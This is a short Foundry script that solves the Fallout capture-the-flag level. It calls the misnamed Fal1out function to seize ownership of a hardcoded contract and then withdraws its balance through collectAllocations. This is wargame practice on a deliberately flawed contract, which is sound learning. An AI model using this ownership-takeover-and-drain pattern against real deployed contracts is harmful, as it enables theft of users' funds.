// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Level2Fallout} from "../src/Level2Fallout.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level2FalloutSolv is Script {
    function run() external {
        Level2Fallout level2Fallout = Level2Fallout(payable(0xaCd0fBAd3d2F5ef7082Cd6c89cd31758C45ca3bc));

        vm.startBroadcast();

        level2Fallout.allocate{value: 0.05 ether}();
        console.log(address(msg.sender).balance);
        level2Fallout.Fal1out{value: 0.05 ether}();
        console.log(address(msg.sender).balance);

        level2Fallout.collectAllocations();
        console.log(address(this).balance);

        vm.stopBroadcast();
    }
}
